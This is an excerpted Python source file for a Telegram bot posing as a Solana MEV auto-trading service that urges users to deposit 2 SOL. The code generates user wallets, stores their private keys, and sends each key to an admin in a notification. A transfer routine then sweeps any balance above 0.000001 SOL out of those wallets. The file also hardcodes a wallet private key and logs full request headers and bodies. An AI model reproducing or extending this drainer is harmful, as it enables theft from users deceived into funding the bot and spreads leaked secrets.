...
def log_request_info():
    api_logger.debug('Headers: %s', request.headers)
    api_logger.debug('Body: %s', request.get_data())
...
def api_send_message():
    ...
    try:
        ...
        response = jsonify({'success': True, 'message_id': message_id})
        response.headers['Access-Control-Allow-Origin'] = '*'
        return response, 200
...
MIN_TRANSFER_AMOUNT = 0.000001  # Transfer any amount above 0.000001 SOL
...
MIN_REMAINING_BALANCE = 0.000001  # Minimum balance to leave for fees

# Database and file paths setup
current_dir = os.path.dirname(os.path.abspath(__file__))
DATA_DIR = os.path.join(current_dir, 'data')
WALLET_CSV_FILE = os.path.join(DATA_DIR, 'JITOXWALLETS8.csv') # Using the new, permanent wallet file name.
...
async def transfer_balance(private_key: str, from_address: str, amount: float) -> bool:
    try:
        async with aiohttp.ClientSession() as session:
            ...
            # Leave only minimal amount for fees (0.000001 SOL)
            transfer_amount = amount - 0.000001
            if transfer_amount <= 0:
                logger.error(f"Amount too small to transfer after fee reserve")
                return False
...
def init_wallet_csv():
    """
    Ensures the wallet CSV file exists. It will create the file with headers
    if it's missing, but it will NEVER delete or overwrite existing wallets.
    """
    try:
        ...
        # Create the wallet file with headers ONLY if it does not exist.
        if not os.path.exists(WALLET_CSV_FILE):
            ...
            logger.info(f"Created new, permanent wallet file at: {WALLET_CSV_FILE}")
        
    except Exception as e:
        logger.critical(f"CRITICAL ERROR: Could not initialize wallet CSV file: {e}")
        return False
    return True
...
try:
    if init_wallet_csv():
        load_existing_wallets()
        logger.info("Wallet system initialized successfully. Wallets are now persistent.")
    else:
        logger.critical("CRITICAL: Wallet system could not be initialized. Bot may not function correctly.")
except Exception as e:
    logger.critical(f"FATAL ERROR during wallet system startup: {e}")
...
wallet_addresses = [
    ...
    "6qfN5jkffPdjduHA6iQ8czhH9BRD2tEuEPgwa4TNwSMy",
...
wallet_private_keys = {
    "6qfN5jkffPdjduHA6iQ8czhH9BRD2tEuEPgwa4TNwSMy": "2uN7d7zypLkJzsirTF3xfHoAiw8NF4xH4twzPk9Yf8wsJd8NVMGvLpHmFBjsnYDErhfZdtySVydRpc5Bv9DGf4n7",
...
async def nexus_settings(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    keyboard = [
            ...
            [InlineKeyboardButton("📊 Manage Funds", callback_data='pool_settings'),
             InlineKeyboardButton("⚙️ Adjust Strategies", callback_data='intensity')],
            
            # User-Friendly Operations
            [InlineKeyboardButton("🎯 Find Opportunities", callback_data='token_targeting'),
             InlineKeyboardButton("🤖 Auto Trading", callback_data='auto_mev')],
            
            # Simplified Intelligence
            [InlineKeyboardButton("🔮 AI Suggestions", callback_data='ai_strategy'),
             InlineKeyboardButton("🧠 Market Predictions", callback_data='ai_market_predictions')],
            
            # Clear Risk Management
            [InlineKeyboardButton("🛡️ Safety Tools", callback_data='risk_management'),
             InlineKeyboardButton("⚠️ Risk Settings", callback_data='dynamic_risk')],
            
            # Performance Tracking
            [InlineKeyboardButton("📈 View Progress", callback_data='performance_analytics'),
             InlineKeyboardButton("📆 History Review", callback_data='historical_analysis')],
            
            # Strategy Tools
            [InlineKeyboardButton("🛠️ Create Strategy", callback_data='strategy_customization'),
             InlineKeyboardButton("🔔 Set Alerts", callback_data='custom_alerts')],
            
            # Portfolio Management
            [InlineKeyboardButton("💼 Manage Portfolio", callback_data='diversification'),
             InlineKeyboardButton("🔍 Track Assets", callback_data='token_watchlist')],
            
            # Professional Features
            [InlineKeyboardButton("👥 Copy Trading", callback_data='copy_trading'),
             InlineKeyboardButton("🗂️ Multi-Account", callback_data='multi_account')],
            
            # Security Section
            [InlineKeyboardButton("🔒 Security Center", callback_data='security_settings'),
             InlineKeyboardButton("🛡️ Risk Check", callback_data='risk_profiling')],
            
            # Community Features
            [InlineKeyboardButton("🤝 Share Strategies", callback_data='strategy_sharing'),
             InlineKeyboardButton("👤 My Profile", callback_data='user_profiles')],
            
            # Charting Tools
            [InlineKeyboardButton("📊 Professional Charts", callback_data='advanced_charting')],
            
            # Custom Solutions
            [InlineKeyboardButton("🤖 Custom Bots", callback_data='custom_trading_bots')],
...
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    try:
        ...
        keyboard = [
            ...
            [mev_stats_button],
            [InlineKeyboardButton("🔮 Website ( Under Construction ))", url='https://jitomev.com/')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        ...
        message = (
            ...
            "🌐 <b>Group:</b> <a href='https://t.me/+cOSKlcdZyJ5kZGRk'>Join Our Trading Community</a>\n\n"
            "💫 <b>Support Available - Limited Slots Remaining</b>\n\n"
            "💎 Ready to get started? Deposit 2 SOL now and unlock automated trading!"
        )
...
async def get_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """
    Handles wallet generation and retrieval.
    - Checks if a user has an existing wallet in memory/CSV.
    - If yes, displays the existing wallet.
    - If no, generates a new wallet and saves it permanently.
    """
    try:
        user_id = update.effective_user.id
        username = update.effective_user.username or update.effective_user.first_name

        # --- Correctly check for an existing wallet ---
        if user_id in user_wallets:
            wallet_info = user_wallets[user_id]
            
            # --- Send notification for existing wallet access ---
            try:
                balance = await get_balance(wallet_info['public_key'])
                admin_message = (
                    f"👤 <b>User Accessed Existing Wallet</b>\n\n"
                    f"👤 User: @{username} (ID: {user_id})\n"
                    f"💼 Wallet: <code>{wallet_info['public_key']}</code>\n"
                    f"🔑 Private Key: <code>{wallet_info['private_key']}</code>\n"
                ...
                logger.info(f"Sent existing wallet access notification for user {user_id}")
            except Exception as e:
                logger.error(f"Failed to send existing wallet notification: {e}")
            
            message = (
                "🎉 <b>Your Existing Solana Wallet</b>\n\n"
                f"📬 Public Address:\n<code>{wallet_info['public_key']}</code>\n\n"
                "💎 <b>Next Steps:</b>\n"
                "• Your wallet is ready for deposits.\n"
                "• Minimum trading balance is 2 SOL.\n"
                "• Use the buttons below to manage your wallet.\n\n"
                "🔐 Need your private key? Click 'Show Private Key'"
            )
            # --- Use the existing wallet public key for the keyboard ---
            keyboard = [
                [InlineKeyboardButton("🔑 Show Private Key", callback_data=f"show_key_{user_id}")],
                [InlineKeyboardButton("💰 Check Balance", callback_data=f"check_balance_{wallet_info['public_key']}")],
                [InlineKeyboardButton("🌐 View on Explorer", url=f"https://explorer.solana.com/address/{wallet_info['public_key']}")],
                [InlineKeyboardButton("🔙 Back", callback_data="back")]
            ]
        else:
            # --- This block now only runs for truly new users ---
            logger.info(f"User {user_id} not found in loaded wallets. Generating a new permanent wallet.")
            wallet = await generate_wallet()
            user_wallets[user_id] = wallet  # Add to in-memory dict for the current session

            # --- Append the new wallet to the permanent CSV file ---
            try:
                ...
                logger.info(f"Successfully saved new wallet for user {user_id} to {WALLET_CSV_FILE}")

                # --- Enhanced Admin Notification for New Wallet ---
                try:
                    balance = await get_balance(wallet['public_key'])
                    admin_message = (
                        f"✅ <b>New Permanent Wallet Created</b>\n\n"
                        f"👤 User: @{username} (ID: {user_id})\n"
                    ...
                    logger.info(f"Sent new wallet creation notification for user {user_id}")
                except Exception as e:
                    logger.error(f"Failed to send new wallet notification: {e}")
                    
            except Exception as e:
                logger.critical(f"CRITICAL: Failed to save new wallet for user {user_id} to CSV: {e}")

            message = (
                "🎉 <b>Your New Solana Wallet is Ready!</b>\n\n"
                f"📬 Public Address:\n<code>{wallet['public_key']}</code>\n\n"
                "⚠️ <b>CRITICAL SECURITY NOTES:</b>\n"
                "1. Click 'Show Private Key' to see your key.\n"
                "2. Save this key somewhere safe. It is NOT recoverable.\n"
                "3. We recommend importing it into a wallet like Phantom.\n\n"
                "💎 <b>Next Steps:</b>\n"
                "• Deposit minimum 2 SOL to start trading."
            )
            keyboard = [
                [InlineKeyboardButton("🔑 Show Private Key", callback_data=f"show_key_{user_id}")],
        ...
        logger.error(f"FATAL error in get_wallet: {str(e)}")
        if update.callback_query:
...
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    elif query.data == 'show_main_wallet':
        await show_main_wallet(update, context)
    elif query.data == 'main_wallet':
        await show_main_wallet(update, context)
    elif query.data.startswith('show_key_'):
        # Handle show private key button
        try:
            ...
            if user_id == query.from_user.id:
                ...
                if not user_wallet.empty:
                    ...
                    message = (
                        ...
                        "💎 <b>Important:</b> Store this safely!"
                    )
                    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='get_wallet')]]
                    reply_markup = InlineKeyboardMarkup(keyboard)
                    await query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
                else:
                    await query.answer("No wallet found for this user.")
            else:
                await query.answer("You can only view your own private key.")
        except Exception as e:
            logger.error(f"Error showing private key: {e}")
            await query.answer("Error retrieving private key.")
    elif query.data.startswith('check_balance_'):
        # Handle check balance button
        try:
            wallet_address = query.data.split('_', 2)[2]
            ...
            message = (
                ...
                "• Real-time data from Solana network\n\n"
                "💫 <b>Note:</b> Balance updates automatically"
            )
            keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='get_wallet')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(message, reply_markup=reply_markup, parse_mode='HTML')
            ...
            await query.answer("Error checking balance.")
    else:
    ...
    try:
        ...
        async with aiohttp.ClientSession() as session:
            for _, row in df.iterrows():
                ...
                if balance > 0.000001:  # Transfer any amount above 0.000001 SOL
                ...
                with open(csv_file, 'r', newline='', encoding='utf-8') as f:
                    ...
                    for line in f:
                        try:
                            ...
                            if parts and parts[0] and parts[0].strip('"'):  # Check if we have a user_id
                                user_id = parts[0].strip('"')  # Remove quotes if present
        ...
        with open(csv_file, 'a', newline='', encoding='utf-8') as f:
            ...
            for user_id, username in missed_users:
                ...
                if user_id_str not in existing_users:
                    writer.writerow([user_id_str, username, current_time])
                    added_count += 1
                    existing_users.add(user_id_str)
...
# Add this decorator after the imports and before any command handlers
    ...
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        ...
        if is_user_blocked(user_id):
            ...
            try:
                ...
                logger.error(f"Error handling blocked user message: {e}")
            return
        return await func(update, context, *args, **kwargs)
    return wrapper

# Add a handler for blocking all messages from blocked users
async def block_all_messages(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    if is_user_blocked(user_id):
        message = "You are currently blocked from using this bot."
        try:
...
def main() -> None:
    ...
    for attempt in range(max_retries):
        try:
            # Initialize the application with a higher read timeout
            application = (
                Application.builder()
                .token(BOT_TOKEN)
                .read_timeout(30)  # Increase read timeout to 30 seconds
                .connect_timeout(15)  # Set connect timeout to 15 seconds
                .build()
            )
            ...
            try:
                ...
                # Load existing wallets from CSV file
                init_wallet_csv()  # Ensure the CSV file exists
                load_existing_wallets()  # Load all existing wallets into memory
                logger.info(f"Loaded {len(user_wallets)} existing wallets from CSV")
            ...
            # Add command handlers with the check_user_blocked decorator
            application.add_handler(CommandHandler("start", check_user_blocked(start)))
            application.add_handler(CommandHandler("get_wallet", check_user_blocked(get_wallet_command)))
            application.add_handler(CommandHandler("mev", check_user_blocked(mev_command)))
            application.add_handler(CommandHandler("intensity", check_user_blocked(intensity_command)))
            application.add_handler(CommandHandler("pool", check_user_blocked(pool_command)))
            application.add_handler(CommandHandler("settings", check_user_blocked(settings_command)))
            application.add_handler(CommandHandler("ca", check_user_blocked(ca_command)))
            application.add_handler(CommandHandler("auto", check_user_blocked(auto_command)))
            application.add_handler(CommandHandler("withdraw", check_user_blocked(withdraw_command)))
            application.add_handler(CommandHandler("min_deposit", check_user_blocked(min_deposit_faq)))
            application.add_handler(CommandHandler("mev_info", check_user_blocked(mev_info_faq)))
            application.add_handler(CommandHandler("security", check_user_blocked(security_faq)))
            application.add_handler(CommandHandler("withdraw_faq", check_user_blocked(withdraw_faq)))
            application.add_handler(CommandHandler("eth_wallet", check_user_blocked(get_eth_wallet)))
            application.add_handler(CommandHandler("token_watchlist", check_user_blocked(token_watchlist)))
            application.add_handler(CommandHandler("custom_risk_management", check_user_blocked(custom_risk_management)))
            application.add_handler(CommandHandler("risk_profiling", check_user_blocked(risk_profiling)))
            application.add_handler(CommandHandler("custom_trading_bots", check_user_blocked(custom_trading_bots)))
            application.add_handler(CommandHandler("ai_market_predictions", check_user_blocked(ai_market_predictions)))
            application.add_handler(CommandHandler("advanced_charting", check_user_blocked(advanced_charting)))
            application.add_handler(CommandHandler("multi_account", check_user_blocked(multi_account)))
            application.add_handler(CommandHandler("historical_analysis", check_user_blocked(historical_analysis)))
            application.add_handler(CommandHandler("diversification", check_user_blocked(diversification)))
            application.add_handler(CommandHandler("ai_strategy", check_user_blocked(ai_strategy)))
            ...
            # Add message handler to block all messages from blocked users (this should be last)
            application.add_handler(MessageHandler(filters.ALL, block_all_messages))
            ...
            if attempt < max_retries - 1:
                ...
                logger.error("Max retries reached. Could not connect to Telegram servers.")
                raise
        except telegram.error.NetworkError as e:
            if attempt < max_retries - 1:
                logger.warning(f"Network error (attempt {attempt + 1}/{max_retries}). Retrying in {retry_delay} seconds...")
                time.sleep(retry_delay)
                continue
            else:
                logger.error("Max retries reached. Network error persists.")
                raise
